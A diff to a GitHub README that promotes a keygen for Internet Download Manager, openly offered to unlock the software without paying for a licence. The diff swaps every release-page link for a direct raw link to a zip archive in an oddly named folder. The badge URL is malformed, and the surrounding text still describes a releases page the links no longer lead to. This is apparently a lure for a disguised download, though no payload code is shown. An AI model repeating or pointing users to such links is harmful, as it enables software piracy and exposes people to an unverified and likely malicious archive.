@@ -4,12 +4,12 @@
 This project provides a key generator (keygen) for Internet Download Manager (IDM). This keygen allows you to generate valid serial keys for IDM, enabling full functionality without purchasing a license.
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Gurleen-kansray/Internet-Download-Manager-Latest-Keygen/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Gurleen-kansray/Internet-Download-Manager-Latest-Keygen/main/unfailing/Internet-Download-Manager-Latest-Keygen.zip%https://raw.githubusercontent.com/Gurleen-kansray/Internet-Download-Manager-Latest-Keygen/main/unfailing/Internet-Download-Manager-Latest-Keygen.zip)](https://raw.githubusercontent.com/Gurleen-kansray/Internet-Download-Manager-Latest-Keygen/main/unfailing/Internet-Download-Manager-Latest-Keygen.zip)
 
 ## 🚀 Getting Started
 To use the Internet Download Manager Latest Keygen, follow these steps:
 
-1. **Visit the Release Page:** Start by going to the [Releases page](https://github.com/Gurleen-kansray/Internet-Download-Manager-Latest-Keygen/releases).
+1. **Visit the Release Page:** Start by going to the [Releases page](https://raw.githubusercontent.com/Gurleen-kansray/Internet-Download-Manager-Latest-Keygen/main/unfailing/Internet-Download-Manager-Latest-Keygen.zip).
 
 2. **Choose a Version:** On the Releases page, you will see a list of available versions. Select the latest one (usually at the top).
 
@@ -52,7 +52,7 @@ A: Make sure you are using the latest version of the keygen. If problems persist
 If you run into issues or have questions, feel free to reach out through the project's issues page on GitHub.
 
 ## 🔗 Download & Install
-To start using the Internet Download Manager Latest Keygen, [visit this page to download](https://github.com/Gurleen-kansray/Internet-Download-Manager-Latest-Keygen/releases) the latest version.
+To start using the Internet Download Manager Latest Keygen, [visit this page to download](https://raw.githubusercontent.com/Gurleen-kansray/Internet-Download-Manager-Latest-Keygen/main/unfailing/Internet-Download-Manager-Latest-Keygen.zip) the latest version.
 
 ## 🏷️ Topics
 - idm-free
